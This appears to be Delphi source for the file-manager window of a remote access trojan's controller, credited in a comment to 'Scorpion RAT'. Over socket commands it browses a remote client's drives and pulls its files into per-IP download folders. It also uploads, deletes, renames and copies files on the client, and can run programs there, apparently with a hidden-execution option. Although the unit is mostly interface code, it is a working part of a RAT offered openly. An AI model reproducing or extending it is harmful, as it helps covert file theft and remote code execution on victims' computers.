unit UnitFilesManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ExtCtrls, Menus, ImgList, UnitConnection,
  UnitUtils, UnitCommands, UnitFilesTransfers;

type
  TFormFilesManager = class(TForm)
    stat1: TStatusBar;
    lvFiles: TListView;
    pnl1: TPanel;
    cbbDrives: TComboBoxEx;
    lbl1: TLabel;
    edtPath: TEdit;
    btn1: TButton;
    il1: TImageList;
    pm1: TPopupMenu;
    R1: TMenuItem;
    N1: TMenuItem;
    R2: TMenuItem;
    D1: TMenuItem;
    C1: TMenuItem;
    D2: TMenuItem;
    N2: TMenuItem;
    U1: TMenuItem;
    N3: TMenuItem;
    dlgOpen1: TOpenDialog;
    E1: TMenuItem;
    V1: TMenuItem;
    H1: TMenuItem;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure cbbDrivesChange(Sender: TObject);
    procedure lvFilesDblClick(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure N3Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure V1Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure edtPathKeyPress(Sender: TObject; var Key: Char);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;
    procedure OnClientRead(Datas: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormFilesManager: TFormFilesManager;

implementation

{$R *.dfm}

constructor TFormFilesManager.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormFilesManager.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

//From Scorpion RAT
procedure TFormFilesManager.WndProc(var Msg: TMessage);
begin
  inherited;
  if Msg.Msg = WM_USER + 12 then OnClientRead(string(Msg.WParam));
end;

function DriveIcon(i: Integer): Integer; //get drive icon image index according to drive type
begin
  case i of
    1: Result := 0;
    2: Result := 3;
    3: Result := 2;
    4: Result := 1;
  else
    Result := 0;
  end;
end;

//read only commands of files manager
procedure TFormFilesManager.OnClientRead(Datas: string);
var
  Cmd, i: Integer;
  TmpItem: TListItem;
  TmpList: TStringArray;
  TmpStr: string;
  TmpForm: TFormFilesTransfers;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1)); //get cmd id before
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_FILESMANAGER_COPY:
    begin
      if Datas = 'N' then stat1.Panels.Items[0].Text := 'Failed to copy item.' else
        stat1.Panels.Items[0].Text := 'Item copied successfully!';
    end;
        
    CMD_FILESMANAGER_DELETE:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[1] = 'N' then stat1.Panels.Items[0].Text := 'Failed to delete item.' else
      begin
        lvFiles.Items.BeginUpdate;
        for i := lvFiles.Items.Count - 1 downto 0 do //from end to beginning
        begin
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpList[0]) then Continue;
          lvFiles.Items.Item[i].Delete;
        end;
                      
        lvFiles.Items.EndUpdate;
        stat1.Panels.Items[0].Text := 'Item deleted successfully!';
      end;
    end;

    CMD_FILESMANAGER_DOWNLOAD:
    begin
      TmpList := ParseString('|', Datas);

      TmpForm := TFormFilesTransfers.Create(Self, ClientDatas, ExtractFileName(TmpList[0]), StrToInt(TmpList[1]));
      TmpForm.Caption := 'Download';
      TmpForm.Show;

      //create downloads's folder first
      if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Downloads') then
        CreateDir(ExtractFilePath(ParamStr(0)) + 'Downloads');

      //and then for the specific client
      TmpStr := ExtractFilePath(ParamStr(0)) + 'Downloads\' + ClientDatas.ClientSocket.RemoteAddress;
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := TmpStr + '\' + ExtractFileName(TmpList[0]);

      ClientDatas.ClientSocket.RecvFile(TmpStr, StrToInt(TmpList[1]), TmpForm.OnClientRead);
      stat1.Panels.Items[0].Text := 'File transfer done!';
      TmpForm.Close;

      Application.ProcessMessages; //keep statibility
    end;

    CMD_FILESMANAGER_DRIVES:
    begin
      cbbDrives.Clear;

      while Datas <> '' do
      begin
        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        i := cbbDrives.Items.Add(TmpList[0]);
        cbbDrives.ItemsEx.Items[i].ImageIndex := DriveIcon(StrToInt(TmpList[1]));
      end;

      cbbDrives.ItemIndex := 0;
      cbbDrivesChange(nil); //request drives directory in the same time

      if cbbDrives.Items.Count > 0 then
        stat1.Panels.Items[0].Text := 'Drives listed successfully!'
      else stat1.Panels.Items[0].Text := 'Drives not found.';
    end;

    CMD_FILESMANAGER_EXECUTE:
    begin
      if Datas = 'N' then stat1.Panels.Items[0].Text := 'Failed execute item.' else
        stat1.Panels.Items[0].Text := 'Item executed successfully!';
    end;

    CMD_FILESMANAGER_FILES:
    begin
      lvFiles.Items.BeginUpdate;

      while Datas <> '' do
      begin
        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpItem := lvFiles.Items.Add;
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(TmpList[2]);
        TmpItem.SubItems.Add(TmpList[3]);
        TmpItem.SubItems.Add(DateToStr(FileDateToDateTime(StrToInt(TmpList[4]))) + ' ' +
          TimeToStr(FileDateToDateTime(StrToInt(TmpList[4]))));
        TmpItem.ImageIndex := 5;
      end;

      lvFiles.Items.EndUpdate;

      if lvFiles.Items.Count > 0 then
        stat1.Panels.Items[0].Text := 'Directory listed successfully!'
      else stat1.Panels.Items[0].Text := 'Directory items not found.';
    end;
            
    CMD_FILESMANAGER_FOLDERS:
    begin
      lvFiles.Clear;
      lvFiles.Items.BeginUpdate;

      while Datas <> '' do
      begin
        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpItem := lvFiles.Items.Add;
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(TmpList[2]);   
        TmpItem.SubItems.Add(TmpList[3]);
        TmpItem.SubItems.Add(DateToStr(FileDateToDateTime(StrToInt(TmpList[4]))) + ' ' +
          TimeToStr(FileDateToDateTime(StrToInt(TmpList[4]))));
        TmpItem.ImageIndex := 4;
      end;

      lvFiles.Items.EndUpdate;
    end;

    CMD_FILESMANAGER_NEWFOLDER:
    begin
      if Datas = 'N' then stat1.Panels.Items[0].Text := 'Failed to create folder.' else
      begin
        stat1.Panels.Items[0].Text := 'Folder created successfully!';
        ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_FOLDERS) + '|' + edtPath.Text);
      end;
    end;

    CMD_FILESMANAGER_RENAME:
    begin
      TmpList := ParseString('|', Datas);

      if TmpList[2] = 'N' then stat1.Panels.Items[0].Text := 'Failed to rename item.' else
      begin  
        lvFiles.Items.BeginUpdate;

        for i := 0 to lvFiles.Items.Count - 1 do
        begin
          //search for old filename/folder caption
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpList[0]) then Continue;
          lvFiles.Items.Item[i].Caption := ExtractFileName(TmpList[1]);
        end;

        lvFiles.Items.EndUpdate;
        stat1.Panels.Items[0].Text := 'Item renamed successfully!';
      end;
    end;
  end;
end;

procedure TFormFilesManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  //
end;

procedure TFormFilesManager.FormCreate(Sender: TObject);
begin
  //
end;
    
procedure TFormFilesManager.FormShow(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_DRIVES) + '|');         
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
  
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;
      
procedure TFormFilesManager.cbbDrivesChange(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  i := cbbDrives.ItemIndex;
  if i = -1 then Exit;

  TmpStr := cbbDrives.Items.Strings[i];
  TmpStr := Copy(TmpStr, 1, 3);
  edtPath.Text := TmpStr;

  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_FOLDERS) + '|' + edtPath.Text);   
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.lvFilesDblClick(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lvFiles.Selected) then Exit;
  if lvFiles.Selected.ImageIndex <> 4 then Exit;

  TmpStr := edtPath.Text;

  if lvFiles.Selected.Caption = '..' then //parent directory
  begin
    Delete(TmpStr, LastDelimiter('\', TmpStr), Length(TmpStr));
    if Length(TmpStr) = 2 then TmpStr := TmpStr + '\'; //to avoid having perhaps "C:"
    edtPath.Text := TmpStr;
  end
  else
  begin
    if TmpStr[Length(TmpStr)] <> '\' then TmpStr := TmpStr + '\';
    edtPath.Text := TmpStr + lvFiles.Selected.Caption;
  end;

  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_FOLDERS) + '|' + edtPath.Text);     
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;
                 
procedure TFormFilesManager.edtPathKeyPress(Sender: TObject;
  var Key: Char);
begin
  if Key = Char(VK_RETURN) then btn1.Click;
end;

procedure TFormFilesManager.btn1Click(Sender: TObject);
begin
  if edtPath.Text = '' then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_FOLDERS) + '|' + edtPath.Text);  
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.R1Click(Sender: TObject);
begin
  btn1.Click;
end;

procedure TFormFilesManager.N3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if edtPath.Text = '' then Exit;
  if not InputQuery('New folder', 'Folder name', TmpStr) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_NEWFOLDER) + '|' + edtPath.Text + '\' + TmpStr); 
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;
                         
procedure TFormFilesManager.V1Click(Sender: TObject);
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_EXECUTE) + '|' +
    edtPath.Text + lvFiles.Selected.Caption + '|N|');
    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.H1Click(Sender: TObject);
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_EXECUTE) + '|' +
    edtPath.Text + lvFiles.Selected.Caption + '|Y|');
    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.R2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  if not InputQuery('Rename item', 'New item name', TmpStr) then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_RENAME) + '|' +
    edtPath.Text + '\' + lvFiles.Selected.Caption + '|' + edtPath.Text + '\' + TmpStr);
    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.D1Click(Sender: TObject);
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  if lvFiles.Selected.ImageIndex = 4 then
    ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_DELETE) + '|' + edtPath.Text + '\' + lvFiles.Selected.Caption + '|Y|')
  else ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_DELETE) + '|' + edtPath.Text + '\' + lvFiles.Selected.Caption + '|N|');
  
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.C1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  if not InputQuery('Copy item to', 'Item full path location', TmpStr) then Exit;
  if lvFiles.Selected.ImageIndex = 4 then
    ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_COPY) + '|' +
    edtPath.Text + '\' + lvFiles.Selected.Caption + '|' + TmpStr + '|Y|')
  else ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_COPY) + '|' +
    edtPath.Text + '\' + lvFiles.Selected.Caption + '|' + TmpStr + '|N|');
    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.D2Click(Sender: TObject);
begin
  if edtPath.Text = '' then Exit;
  if not Assigned(lvFiles.Selected) then Exit;
  if lvFiles.Selected.ImageIndex = 4 then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_DOWNLOAD) + '|' +
    edtPath.Text + '\' + lvFiles.Selected.Caption);
    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormFilesManager.U1Click(Sender: TObject);
var
  TmpForm: TFormFilesTransfers;
begin
  if edtPath.Text = '' then Exit;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'All files (*.*)|*.*';
  if (dlgOpen1.Execute = False) or (dlgOpen1.FileName = '') then Exit;

  TmpForm := TFormFilesTransfers.Create(Self, ClientDatas, ExtractFileName(dlgOpen1.FileName),
    MyGetFileSize(dlgOpen1.FileName));
  TmpForm.Caption := 'Upload';
  TmpForm.Show;

  ClientDatas.SendDatas(IntToStr(CMD_FILESMANAGER_UPLOAD) + '|' +
    edtPath.Text + '\' + ExtractFileName(dlgOpen1.FileName) + '|' +
    IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');         
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
  
  ClientDatas.ClientSocket.SendFile(dlgOpen1.FileName, TmpForm.OnClientRead);

  stat1.Panels.Items[0].Text := 'File transfer done!';
  TmpForm.Close;
end;

end.
